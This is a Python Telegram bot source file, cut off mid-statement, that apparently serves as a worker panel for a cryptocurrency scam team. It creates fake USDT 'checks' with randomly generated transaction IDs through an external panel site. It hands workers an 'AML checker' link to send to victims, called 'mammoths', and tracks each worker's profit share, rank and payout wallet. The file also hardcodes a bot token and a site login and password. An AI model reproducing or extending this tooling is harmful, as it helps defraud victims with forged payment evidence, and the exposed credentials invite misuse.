import asyncio
import logging
import os
import json
import random
import string
import re
import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, InputMediaPhoto
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

logging.basicConfig(level=logging.INFO)

# ───────── НАСТРОЙКИ ─────────
BOT_TOKEN = "8675353888:AAGVSKQGQqSNkRLE_nC1OtLpJDklyDcyAkU"
LOG_CHAT_ID = -1003842299691
ADMIN_IDS = [7636751730, 7181364375]
WALLETS_CHAT_ID = -1003842299691

SITE_URL = "https://tm-control.cc"
SITE_LOGIN = "horunochka"
SITE_PASSWORD = "heltyx125"

PORT = int(os.environ.get("PORT", 8080))
CHANNEL_LINK = "https://t.me/+L1b9aprvcJc5MTc6"

PHOTOS = {
    "menu":           "photos/menu.png",
    "change_tag":     "photos/change_tag.png",
    "create_menu":    "photos/create_menu.png",
    "wallet":         "photos/wallet.png",
    "my_invoices":    "photos/my_invoices.png",
    "create_link":    "photos/create_link.png",
    "create_invoice": "photos/create_invoice.png",
    "domen":          "photos/domen.png",
}

DATA_FILE = "data.json"
_photo_cache = {}

# ───────── РАНГИ ─────────
RANKS = [
    "ГЕРЦОГ",
    "МАРКИЗ",
    "ГРАФ",
    "ВИКОНТ",
    "БАРОН",
    "ПРИНЦ",
]

# ───────── КАСТОМНЫЕ ЭМОДЗИ ─────────
def ce(emoji_id: str) -> str:
    return f'<tg-emoji emoji-id="{emoji_id}">⭐</tg-emoji>'

E_NO_ACCESS  = ce("5240241223632954241")
E_ACCESS_OK  = ce("5206607081334906820")
E_PROFILE    = ce("5373346752671804066")
E_ID         = ce("5296587908906511469")
E_PROFIT     = ce("5372874186010158207")
E_INVOICES   = ce("5298853345241358103")
E_WALLET     = ce("5237868881267153432")
E_EDIT_TAG   = ce("5301173701323028420")
E_CREATE     = ce("5373342633798167891")
E_GEN_TX     = ce("5294436345039577067")
E_DONE       = ce("5296482716567495148")
E_AML        = ce("5237868881267153432")
E_MAMMOTH    = ce("5296372434692234934")
E_MY_INV     = ce("5258382581375723416")
E_WAIT       = ce("5296482716567495148")
E_ERROR      = ce("5240241223632954241")
E_OK         = ce("5206607081334906820")
E_ADMIN      = ce("5373346752671804066")
E_STAR       = ce("5373318693650458620")
E_DELETE     = ce("5240241223632954241")
E_PERCENT    = ce("5372874186010158207")
E_RANK       = ce("5460980668378931880")
E_CUP        = ce("5312160339335347417")

# ───────── БАЗА ДАННЫХ ─────────
def load_data() -> dict:
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {"users": {}, "allowed": [], "revoked": [], "tag_counter": 0}

def save_data(data: dict):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def get_user(data: dict, user_id: int) -> dict:
    uid = str(user_id)
    if uid not in data["users"]:
        data["users"][uid] = {
            "tag": None,
            "wallet": None,
            "profit": 0,
            "invoices": [],
            "percent": 50,
            "rank": 0,
        }
    user = data["users"][uid]
    if "percent" not in user:
        user["percent"] = 50
    if "rank" not in user:
        user["rank"] = 0
    return user

def is_allowed(data: dict, user_id: int) -> bool:
    return user_id in ADMIN_IDS or user_id in data.get("allowed", [])

# ───────── КЛАВИАТУРЫ ─────────
def main_menu_kb(user_id: int) -> InlineKeyboardMarkup:
    kb = [
        [
            InlineKeyboardButton(text="Изменить тег", callback_data="change_tag"),
            InlineKeyboardButton(text="Кошелёк", callback_data="wallet_menu"),
        ],
        [
            InlineKeyboardButton(text="Создание", callback_data="create_menu"),
            InlineKeyboardButton(text="Домен", callback_data="domen_menu"),
        ],
        [
            InlineKeyboardButton(text="Канал", url=CHANNEL_LINK),
        ],
    ]
    if user_id in ADMIN_IDS:
        kb.append([InlineKeyboardButton(text="Админ панель", callback_data="admin_panel")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def create_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Создать чек", callback_data="create_invoice"),
            InlineKeyboardButton(text="Создать ссылку", callback_data="create_link"),
        ],
        [
            InlineKeyboardButton(text="Мои чеки", callback_data="my_invoices"),
            InlineKeyboardButton(text="Назад", callback_data="back_main"),
        ],
    ])

def wallet_menu_kb(has_wallet: bool) -> InlineKeyboardMarkup:
    kb = []
    if not has_wallet:
        kb.append([InlineKeyboardButton(text="Привязать USDT TRC-20", callback_data="bind_wallet")])
    else:
        kb.append([InlineKeyboardButton(text="Изменить кошелёк", callback_data="bind_wallet")])
    kb.append([InlineKeyboardButton(text="Назад", callback_data="back_main")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def invoice_actions_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Удалить чек", callback_data="invoice_delete"),
            InlineKeyboardButton(text="Все чеки", callback_data="my_invoices"),
        ],
        [InlineKeyboardButton(text="В меню", callback_data="back_main")],
    ])

def aml_back_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад", callback_data="create_menu")],
    ])

def tx_id_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Сгенерировать TX ID", callback_data="gen_tx_id")],
    ])

def invoice_title_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="PAYMENT", callback_data="title_PAYMENT"),
            InlineKeyboardButton(text="REWARD",  callback_data="title_REWARD"),
        ],
    ])

def admin_kb(data: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Выдать доступ",    callback_data="admin_add"),
            InlineKeyboardButton(text="Забрать доступ",   callback_data="admin_remove"),
        ],
        [
            InlineKeyboardButton(text="Начислить профит", callback_data="admin_profit"),
            InlineKeyboardButton(text="Повысить процент", callback_data="admin_percent"),
        ],
        [
            InlineKeyboardButton(text="Изменить ранг",    callback_data="admin_rank"),
            InlineKeyboardButton(text="Назад",            callback_data="back_main"),
        ],
    ])

def invoices_list_kb(invoices: list, page: int = 0) -> InlineKeyboardMarkup:
    per_page = 5
    total    = len(invoices)
    start    = page * per_page
    end      = min(start + per_page, total)
    kb = []
    for i in range(start, end):
        inv = invoices[i]
        kb.append([InlineKeyboardButton(
            text=f"{inv['amount']} USDT — {inv['title']}",
            callback_data=f"inv_view_{i}"
        )])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="◀", callback_data=f"inv_page_{page-1}"))
    if end < total:
        nav.append(InlineKeyboardButton(text="▶", callback_data=f"inv_page_{page+1}"))
    if nav:
        kb.append(nav)
    kb.append([InlineKeyboardButton(text="Назад", callback_data="create_menu")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def single_invoice_kb(idx: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Удалить чек", callback_data=f"inv_delete_{idx}"),
            InlineKeyboardButton(text="К списку",    callback_data="my_invoices"),
        ],
    ])

def rank_select_kb(user_id_target: int) -> InlineKeyboardMarkup:
    kb = []
    for rank_idx in range(1, len(RANKS)):
        kb.append([InlineKeyboardButton(
            text=f"{'⭐' * rank_idx} {RANKS[rank_idx]}",
            callback_data=f"set_rank_{user_id_target}_{rank_idx}"
        )])
    kb.append([InlineKeyboardButton(text="Отмена", callback_data="admin_panel")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

# ───────── ФОРМАТИРОВАНИЕ ─────────
def format_main_menu(user: dict, user_id: int, username: str) -> str:
    tag     = user.get("tag") or "не установлен"
    wallet  = user.get("wallet") or "не привязан"
    profit  = user.get("profit", 0)
    count   = len(user.get("invoices", []))
    percent = user.get("percent", 50)
    rank_idx = user.get("rank", 0)
    rank_name = RANKS[rank_idx] if 0 <= rank_idx < len(RANKS) else RANKS[0]
    uname   = f"@{username}" if username else "не указан"

    random.seed(user_id)
    fake_id = ''.join([str(random.randint(0, 9)) for _ in range(16)])
    random.seed()

    return (
        f"{E_PROFILE} <b>Ваш профиль</b>\n\n"
        f"{E_ID} <b>ID:</b> <code>{user_id}</code>\n"
        f"{E_ID} <b>Юзернейм:</b> {uname}\n"
        f"{E_ID} <b>Тег:</b> <i>{tag}</i>\n\n"
        f"<code></code>{E_CUP} <b>ПРОЦЕНТ ВОРКЕРА:</b> {percent}%\n\n"
        f"{E_PROFIT} <b>Общий профит:</b> <b>{profit} USDT</b>\n"
        f"{E_INVOICES} <b>Активных чеков:</b> <b>{count}</b>\n\n"
        f"<code></code>{E_RANK} <b>РАНГ:</b> {rank_name}\n\n"
        f"{E_WALLET} <b>Кошелёк:</b> <code>{wallet}</code>"
    )

def format_admin_panel(data: dict) -> str:
    allowed = data.get("allowed", [])
    revoked = data.get("revoked", [])
    allowed_lines = "\n".join([f" • <code>{uid}</code>" for uid in allowed]) if allowed else " нет"
    revoked_lines = "\n".join([f" • <code>{uid}</code>" for uid in revoked[-10:]]) if revoked else " нет"
    return (
        f"<b>Админ панель</b>\n\n"
        f"<b>Подключённые</b> — <b>{len(allowed)}</b> чел.\n{allowed_lines}\n\n"
        f"<b>Заблокированные</b> — <b>{len(revoked)}</b> чел.\n{revoked_lines}"
    )

def format_invoices_list(invoices: list, page: int = 0) -> str:
    per_page = 5
    total    = len(invoices)
    if total == 0:
        return f"{E_MY_INV} <b>Мои чеки</b>\n\n<i>У вас пока нет созданных чеков.</i>"
    start = page * per_page + 1
    end   = min((page + 1) * per_page, total)
    return (
        f"{E_MY_INV} <b>Мои чеки</b> — всего: <b>{total}</b>\n"
        f"<i>Показано {start}–{end}</i>\n\n"
        f"Нажмите на чек, чтобы увидеть детали и удалить его."
    )

def format_single_invoice(inv: dict, idx: int) -> str:
    return (
        f"{E_DONE} <b>Чек #{idx + 1}</b>\n\n"
        f"<b>Сумма:</b> {inv['amount']} USDT\n"
        f"<b>Название:</b> {inv['title']}\n"
        f"{E_EDIT_TAG} <b>TX ID:</b> <code>{inv['tx_id']}</code>\n\n"
        f"<b>Ссылка:</b>\n<code>{inv['link']}</code>"
    )

# ───────── ФОТО ─────────
async def send_with_photo(target, text: str, photo_key: str, reply_markup=None):
    global _photo_cache
    photo_path = PHOTOS.get(photo_key)
    has_photo_file = photo_path and os.path.exists(photo_path)
    new_photo = _photo_cache.get(photo_key)
    if not new_photo and has_photo_file:
        new_photo = FSInputFile(photo_path)
    is_photo_message = hasattr(target, 'photo') and target.photo
    if is_photo_message:
        if new_photo:
            try:
                msg = await target.edit_media(
                    media=InputMediaPhoto(media=new_photo, caption=text, parse_mode="HTML"),
                    reply_markup=reply_markup
                )
                if msg and msg.photo and isinstance(new_photo, FSInputFile):
                    _photo_cache[photo_key] = msg.photo[-1].file_id
                return msg
            except Exception as e:
                logging.warning(f"edit_media не сработал ({photo_key}): {e}")
                if isinstance(new_photo, str):
                    _photo_cache.pop(photo_key, None)
        try:
            return await target.edit_caption(caption=text, reply_markup=reply_markup, parse_mode="HTML")
        except Exception as e:
            logging.warning(f"edit_caption не сработал: {e}")
            return target
    else:
        try:
            return await target.edit_text(text=text, reply_markup=reply_markup, parse_mode="HTML")
        except Exception as e:
            logging.warning(f"edit_text не сработал: {e}")
            return target

async def send_new_with_photo(target, text: str, photo_key: str, reply_markup=None):
    global _photo_cache
    photo_path = PHOTOS.get(photo_key)
    has_photo_file = photo_path and os.path.exists(photo_path)
    cached = _photo_cache.get(photo_key)
    if cached:
        try:
            msg = await target.answer_photo(photo=cached, caption=text, reply_markup=reply_markup, parse_mode="HTML")
            return msg
        except Exception as e:
            logging.warning(f"Кэш {photo_key} не сработал: {e}")
            _photo_cache.pop(photo_key, None)
    if has_photo_file:
        try:
            photo = FSInputFile(photo_path)
            msg = await target.answer_photo(photo=photo, caption=text, reply_markup=reply_markup, parse_mode="HTML")
            if msg and msg.photo:
                _photo_cache[photo_key] = msg.photo[-1].file_id
            return msg
        except Exception as e:
            logging.warning(f"Не удалось отправить фото {photo_key}: {e}")
    return await target.answer(text, reply_markup=reply_markup, parse_mode="HTML")

# ───────── ЛОГИРОВАНИЕ ─────────
async def log_to_admin(bot: "Bot", text: str):
    try:
        await bot.send_message(LOG_CHAT_ID, text, parse_mode="HTML")
    except Exception as e:
        logging.warning(f"Не удалось отправить лог: {e}")

# ───────── API САЙТА (без Playwright) ─────────
_api_token: str | None = None
_api_session: aiohttp.ClientSession | None = None
_api_domain_id: int | None = None

async def get_api_session() -> aiohttp.ClientSession:
    global _api_session
    if _api_session is None or _api_session.closed:
        _api_session = aiohttp.ClientSession()
    return _api_session

async def api_login() -> str | None:
    global _api_token
    session = await get_api_session()
    try:
        async with session.post(
            f"{SITE_URL}/api/auth/login",
            json={"login": SITE_LOGIN, "password": SITE_PASSWORD},
            timeout=aiohttp.ClientTimeout(total=30)
        ) as resp:
            data = await resp.json()
            if data.get("success"):
                _api_token = data["data"]["token"]
                logging.info("API: залогинился успешно")
                return _api_token
            else:
                logging.error(f"API login failed: {data}")
    except Exception as e:
        logging.error(f"API login ошибка: {e}")
    return None

async def get_token() -> str | None:
    global _api_token
    if _api_token:
        return _api_token
    return await api_login()

async def get_domain_id() -> int | None:
    global _api_domain_id
    if _api_domain_id:
        return _api_domain_id
    token = await get_token()
    if not token:
        return None
    session = await get_api_session()
    try:
        async with session.get(
            f"{SITE_URL}/api/domains",
            headers={"Authorization": f"Bearer {token}"},
            timeout=aiohttp.ClientTimeout(total=30)
        ) as resp:
            data = await resp.json()
            logging.info(f"Домены: {data}")
            if data.get("success") and data.get("data"):
                domains = data["data"]
                if isinstance(domains, list) and len(domains) > 0:
                    _api_domain_id = domains[0]["id"]
                    logging.info(f"Используем domain_id: {_api_domain_id}")
                    return _api_domain_id
                elif isinstance(domains, dict):
                    _api_domain_id = domains.get("id")
                    return _api_domain_id
    except Exception as e:
        logging.error(f"get_domain_id ошибка: {e}")
    return None

async def site_create_invoice(amount: str, tx_id: str, title: str, domain_name: str = None) -> str | None:
    global _api_token, _api_domain_id
    for attempt in range(2):
        token = await get_token()
        if not token:
            logging.error("Нет токена")
            return None
        domain_id = await get_domain_id()
        if not domain_id:
            logging.error("Нет domain_id")
            return None
        session = await get_api_session()
        try:
            async with session.post(
                f"{SITE_URL}/api/domains/{domain_id}/invoice",
                json={
                    "amount": float(amount),
                    "currency": "USDT",
                    "tx_id": tx_id,
                    "title": title,
                },
                headers={"Authorization": f"Bearer {token}"},
                timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                data = await resp.json()
                logging.info(f"create_invoice response: {data}")
                if resp.status == 401:
                    logging.info("Токен протух, логинюсь заново...")
                    _api_token = None
                    await api_login()
                    continue
                if data.get("success"):
                    inv = data["data"]
                    inv_domain = inv.get("domain", "")
                    path = inv.get("path", "")
                    link = f"https://{inv_domain}/{path}"
                    # Сохраняем invoice id для удаления
                    return link, inv.get("id"), domain_id
                else:
                    logging.error(f"create_invoice failed: {data}")
                    return None
        except Exception as e:
            logging.error(f"site_create_invoice ошибка: {e}")
            return None
    return None

async def site_delete_invoice(invoice_id: int, domain_id: int) -> bool:
    global _api_token
    for attempt in range(2):
        token = await get_token()
        if not token:
            return False
        session = await get_api_session()
        try:
            async with session.delete(
                f"{SITE_URL}/api/domains/{domain_id}/invoice/{invoice_id}",
                headers={"Authorization": f"Bearer {token}"},
                timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                logging.info(f"delete_invoice status: {resp.status}")
                if resp.status == 401:
                    _api_token = None
                    await api_login()
                    continue
                return resp.status in (200, 204)
        except Exception as e:
            logging.error(f"site_delete_invoice ошибка: {e}")
            return False
    return False

# ───────── BOT ─────────
bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher(storage=MemoryStorage())

class InvoiceForm(StatesGroup):
    amount = State()
    tx_id  = State()
    title  = State()

class AdminForm(StatesGroup):
    add_user      = State()
    remove_user   = State()
    profit_id     = State()
    profit_amount = State()
    percent_id    = State()
    percent_value = State()
    rank_id       = State()

class ProfileForm(StatesGroup):
    change_tag  = State()
    bind_wallet = State()

@dp.message(F.text == "/wallets")
async def cmd_wallets(message: Message):
    if message.chat.id != WALLETS_CHAT_ID:
        return
    if message.from_user.id not in ADMIN_IDS:
        try:
            await message.delete()
        except Exception:
            pass
        return
    data = load_data()
    users = data.get("users", {})
    lines = []
    for uid, user in users.items():
        wallet = user.get("wallet")
        if not wallet:
            continue
        tag = user.get("tag") or "—"
        lines.append(f"👤 <code>{uid}</code> | {tag}\n💳 <code>{wallet}</code>")
    if not lines:
        await message.answer("💳 <b>Нет пользователей с привязанными кошельками.</b>", parse_mode="HTML")
        return
    text = "💳 <b>Кошельки воркеров</b>\n\n" + "\n\n".join(lines)
    await message.answer(text, parse_mode="HTML")

# ───────── ВСПОМОГАТЕЛЬНЫЕ ─────────
def gen_tx_id() -> str:
    return ''.join(random.choices(string.hexdigits.lower(), k=64))

def fmt_user(tg_user) -> str:
    uname = f"@{tg_user.username}" if tg_user.username else f"id={tg_user.id}"
    return f"{uname} (<code>{tg_user.id}</code>)"

# ───────── ХЕНДЛЕРЫ ─────────
@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    user_id = message.from_user.id
    data    = load_data()
    try:
        await message.delete()
    except Exception:
        pass
    if not is_allowed(data, user_id):
        await message.answer(
            f"{E_NO_ACCESS} <b>Нет доступа</b>\n\nОбратитесь к администратору.",
            parse_mode="HTML"
        )
        return
    user = get_user(data, user_id)
    save_data(data)
    await send_new_with_photo(
        message,
        format_main_menu(user, user_id, message.from_user.username),
        "menu",
        reply_markup=main_menu_kb(user_id)
    )

@dp.callback_query(F.data == "back_main")
async def cb_back_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.answer()
    data = load_data()
    user = get_user(data, callback.from_user.id)
    save_data(data)
    await send_with_photo(
        callback.message,
        format_main_menu(user, callback.from_user.id, callback.from_user.username),
        "menu",
        reply_markup=main_menu_kb(callback.from_user.id)
    )

# ── Тег ──
@dp.callback_query(F.data == "change_tag")
async def cb_change_tag(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    data        = load_data()
    user        = get_user(data, callback.from_user.id)
    current_tag = user.get("tag") or "не установлен"
    text = (
        f"{E_EDIT_TAG} <b>Изменить тег</b>\n\n"
        f"Текущий тег: <i>{current_tag}</i>\n\n"
        f"Введите новый тег <b>(до 32 символов)</b>:"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад", callback_data="back_main")]
    ])
    await send_with_photo(callback.message, text, "change_tag", reply_markup=kb)
    await state.set_state(ProfileForm.change_tag)

@dp.message(ProfileForm.change_tag)
async def handle_change_tag(message: Message, state: FSMContext):
    tag = message.text.strip()
    if len(tag) > 32:
        try:
            await message.delete()
        except Exception:
            pass
        return
    data = load_data()
    user = get_user(data, message.from_user.id)
    old_tag = user.get("tag") or "не установлен"
    user["tag"] = tag
    save_data(data)
    await state.clear()
    try:
        await message.delete()
    except Exception:
        pass
    await send_new_with_photo(
        message,
        format_main_menu(user, message.from_user.id, message.from_user.username),
        "menu",
        reply_markup=main_menu_kb(message.from_user.id)
    )
    await log_to_admin(bot,
        f"{E_EDIT_TAG} <b>Смена тега</b>\n"
        f"👤 {fmt_user(message.from_user)}\n"
        f"<b>Был:</b> {old_tag}\n"
        f"<b>Стал:</b> {tag}"
    )

# ── Кошелёк ──
@dp.callback_query(F.data == "wallet_menu")
async def cb_wallet_menu(callback: CallbackQuery):
    await callback.answer()
    data   = load_data()
    user   = get_user(data, callback.from_user.id)
    wallet = user.get("wallet")
    wallet_text = f"<code>{wallet}</code>" if wallet else "<i>не привязан</i>"
    await send_with_photo(
        callback.message,
        f"{E_WALLET} <b>Кошелёк</b>\n\nСтатус: {wallet_text}",
        "wallet",
        reply_markup=wallet_menu_kb(bool(wallet))
    )

@dp.callback_query(F.data == "bind_wallet")
async def cb_bind_wallet(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад", callback_data="wallet_menu")]
    ])
    await send_with_photo(
        callback.message,
        f"{E_WALLET} <b>USDT TRC-20</b>\n\nВведите адрес вашего кошелька:",
        "wallet",
        reply_markup=kb
    )
    await state.set_state(ProfileForm.bind_wallet)

@dp.message(ProfileForm.bind_wallet)
async def handle_bind_wallet(message: Message, state: FSMContext):
    wallet = message.text.strip()
    try:
        await message.delete()
    except Exception:
        pass
    if len(wallet) < 10:
        return
    data = load_data()
    user = get_user(data, message.from_user.id)
    old_wallet = user.get("wallet") or "не привязан"
    user["wallet"] = wallet
    save_data(data)
    await state.clear()
    await send_new_with_photo(
        message,
        format_main_menu(user, message.from_user.id, message.from_user.username),
        "menu",
        reply_markup=main_menu_kb(message.from_user.id)
    )
    await log_to_admin(bot,
        f"{E_WALLET} <b>Смена кошелька</b>\n"
        f"👤 {fmt_user(message.from_user)}\n"
        f"<b>Был:</b> <code>{old_wallet}</code>\n"
        f"<b>Стал:</b> <code>{wallet}</code>"
    )

# ── Создание ──
@dp.callback_query(F.data == "create_menu")
async def cb_create_menu(callback: CallbackQuery):
    await callback.answer()
    await send_with_photo(
        callback.message,
        f"{E_CREATE} <b>Создание</b>\n\nВыберите действие:",
        "create_menu",
        reply_markup=create_menu_kb()
    )

@dp.callback_query(F.data == "create_link")
async def cb_create_link(callback: CallbackQuery):
    await callback.answer()
    text = (
        f"{E_AML} <b>AML Чекер</b>\n\n"
        f"Ссылка: https://amlchecker.website/\n\n"
        f"Скопируйте и отправьте {E_MAMMOTH}"
    )
    await send_with_photo(callback.message, text, "create_link", reply_markup=aml_back_kb())

# ── Домен ──
@dp.callback_query(F.data == "domen_menu")
async def cb_domen_menu(callback: CallbackQuery):
    await callback.answer()
    text = (
        f"{E_STAR} <b>Домен</b>\n\n"
        f"На данный момент у вас не поставлено ни одного домена.\n\n"
        f"Чтобы купить домен, подключить и закрепить его за панелью — "
        f"отпишитесь одному из владельцев:\n\n"
        f"{E_PROFILE} @Malinnowskii\n"
        f"{E_PROFILE} @name_try"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад", callback_data="back_main")]
    ])
    await send_with_photo(callback.message, text, "domen", reply_markup=kb)

# ── Список чеков ──
@dp.callback_query(F.data == "my_invoices")
async def cb_my_invoices(callback: CallbackQuery):
    await callback.answer()
    data     = load_data()
    user     = get_user(data, callback.from_user.id)
    invoices = user.get("invoices", [])
    await send_with_photo(
        callback.message,
        format_invoices_list(invoices, 0),
        "my_invoices",
        reply_markup=invoices_list_kb(invoices, 0)
    )

@dp.callback_query(F.data.startswith("inv_page_"))
async def cb_inv_page(callback: CallbackQuery):
    await callback.answer()
    page_num = int(callback.data.replace("inv_page_", ""))
    data     = load_data()
    user     = get_user(data, callback.from_user.id)
    invoices = user.get("invoices", [])
    await send_with_photo(
        callback.message,
        format_invoices_list(invoices, page_num),
        "my_invoices",
        reply_markup=invoices_list_kb(invoices, page_num)
    )

@dp.callback_query(F.data.startswith("inv_view_"))
async def cb_inv_view(callback: CallbackQuery):
    await callback.answer()
    idx      = int(callback.data.replace("inv_view_", ""))
    data     = load_data()
    user     = get_user(data, callback.from_user.id)
    invoices = user.get("invoices", [])
    if idx >= len(invoices):
        await callback.answer("⚠️ Чек не найден.", show_alert=True)
        return
    await send_with_photo(
        callback.message,
        format_single_invoice(invoices[idx], idx),
        "my_invoices",
        reply_markup=single_invoice_kb(idx)
    )

@dp.callback_query(F.data.startswith("inv_delete_"))
async def cb_inv_delete(callback: CallbackQuery):
    await callback.answer()
    idx     = int(callback.data.replace("inv_delete_", ""))
    user_id = callback.from_user.id
    data    = load_data()
    user    = get_user(data, user_id)
    invoices = user.get("invoices", [])
    if idx >= len(invoices):
        await callback.answer("⚠️ Чек не найден.", show_alert=True)
        return
    inv = invoices[idx]
    await send_with_photo(callback.message, f"{E_WAIT} <b>Удаляю чек...</b>", "my_invoices")

    invoice_id = inv.get("invoice_id")
    domain_id  = inv.get("domain_id")
    ok = False
    if invoice_id and domain_id:
        ok = await site_delete_invoice(invoice_id, domain_id)
    else:
        ok = True  # старые чеки без id просто удаляем локально

    if ok:
        user["invoices"].pop(idx)
        save_data(data)
        result_text = f"{E_OK} <b>Чек удалён.</b>\n\n"
    else:
        result_text = f"{E_ERROR} Не удалось удалить чек. Попробуйте позже.\n\n"

    updated = user.get("invoices", [])
    await send_with_photo(
        callback.message,
        result_text + format_invoices_list(updated, 0),
        "my_invoices",
        reply_markup=invoices_list_kb(updated, 0)
    )
    await log_to_admin(bot,
        f"{E_ERROR} <b>Чек удалён</b>\n"
        f"👤 {fmt_user(callback.from_user)}\n"
        f"<b>Сумма:</b> {inv.get('amount')} USDT\n"
        f"<b>Название:</b> {inv.get('title')}\n"
        f"<b>Ссылка:</b> {inv.get('link')}"
    )

@dp.callback_query(F.data == "invoice_delete")
async def cb_invoice_delete(callback: CallbackQuery):
    await callback.answer()
    user_id  = callback.from_user.id
    data     = load_data()
    user     = get_user(data, user_id)
    invoices = user.get("invoices", [])
    if not invoices:
        await send_with_photo(
            callback.message,
            f"{E_ERROR} Нет активных чеков.",
            "my_invoices",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Назад", callback_data="back_main")]
            ])
        )
        return
    last_inv = invoices[-1]
    await send_with_photo(callback.message, f"{E_WAIT} <b>Удаляю чек...</b>", "my_invoices")

    invoice_id = last_inv.get("invoice_id")
    domain_id  = last_inv.get("domain_id")
    ok = False
    if invoice_id and domain_id:
        ok = await site_delete_invoice(invoice_id, domain_id)
    else:
        ok = True

    back_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="В меню", callback_data="back_main")]
    ])
    if ok:
        user["invoices"].pop()
        save_data(data)
        result = f"{E_OK} <b>Чек удалён.</b>"
    else:
        result = f"{E_ERROR} Не удалось удалить чек."

    await send_with_photo(callback.message, result, "my_invoices", reply_markup=back_kb)
    await log_to_admin(bot,
        f"{E_ERROR} <b>Чек удалён (быстрое удаление)</b>\n"
        f"👤 {fmt_user(callback.from_user)}\n"
        f"<b>Сумма:</b> {last_inv.get('amount')} USDT\n"
        f"<b>Ссылка:</b> {last_inv.get('link')}"
    )

# ── УДАЛИТЬ ЧЕК АДМИНИСТРАТОРОМ ──
@dp.callback_query(F.data.startswith("admin_del_inv_"))
async def cb_admin_del_inv(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔️ Нет прав.", show_alert=True)
        return
    await callback.answer()
    parts = callback.data.replace("admin_del_inv_", "").split("_")
    if len(parts) < 2:
        await callback.answer("⚠️ Некорректные данные.", show_alert=True)
        return
    owner_id = int(parts[0])
    inv_idx  = int(parts[1])
    data = load_data()
    user = get_user(data, owner_id)
    invoices = user.get("invoices", [])
    if inv_idx >= len(invoices):
        await callback.message.edit_text("⚠️ Чек уже удалён или не найден.", reply_markup=None)
        return
    inv = invoices[inv_idx]
    await callback.message.edit_text(callback.message.text + "\n\n⏳ Удаляю чек...", reply_markup=None)

    invoice_id = inv.get("invoice_id")
    domain_id  = inv.get("domain_id")
    ok = False
    if invoice_id and domain_id:
        ok = await site_delete_invoice(invoice_id, domain_id)
    else:
        ok = True

    if ok:
        user["invoices"].pop(inv_idx)
        save_data(data)
        await callback.message.edit_text(
            callback.message.text.replace("⏳ Удаляю чек...", f"{E_OK} Чек удалён администратором."),
        )
        try:
            await bot.send_message(
                owner_id,
                f"{E_DELETE} <b>Ваш чек был удалён администратором.</b>\n\n"
                f"<b>Сумма:</b> {inv.get('amount')} USDT\n"
                f"<b>Название:</b> {inv.get('title')}",
                parse_mode="HTML"
            )
        except Exception:
            pass
        await log_to_admin(bot,
            f"{E_DELETE} <b>Чек удалён администратором</b>\n"
            f"Чей чек: <code>{owner_id}</code>\n"
            f"<b>Сумма:</b> {inv.get('amount')} USDT\n"
            f"Кто удалил: {fmt_user(callback.from_user)}"
        )
    else:
        await callback.message.edit_text(f"{E_ERROR} Не удалось удалить чек. Попробуйте позже.")

# ── Создание чека ──
@dp.callback_query(F.data == "create_invoice")
async def cb_create_invoice(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    user_id = callback.from_user.id
    data    = load_data()
    if not is_allowed(data, user_id):
        await callback.answer("⛔️ Нет доступа.", show_alert=True)
        return
    text = (
        f"{E_EDIT_TAG} <b>Создание чека</b>\n\n"
        f"Введите сумму <b>(от 0 до 500 000)</b>:\n\n"
        f"<i>Валюта: USDT (автоматически)</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отмена", callback_data="create_menu")]
    ])
    await send_with_photo(callback.message, text, "create_invoice", reply_markup=kb)
    await state.update_data(bot_msg_id=callback.message.message_id, bot_msg_chat_id=callback.message.chat.id)
    await state.set_state(InvoiceForm.amount)

@dp.message(InvoiceForm.amount)
async def handle_invoice_amount(message: Message, state: FSMContext):
    raw = message.text.strip().replace(",", ".")
    try:
        await message.delete()
    except Exception:
        pass
    try:
        amount = float(raw)
    except ValueError:
        return
    if amount < 0 or amount > 500000:
        return
    await state.update_data(amount=raw)
    state_data = await state.get_data()
    bot_msg_id = state_data.get("bot_msg_id")
    bot_msg_chat_id = state_data.get("bot_msg_chat_id")
    if bot_msg_id and bot_msg_chat_id:
        try:
            await bot.edit_message_caption(
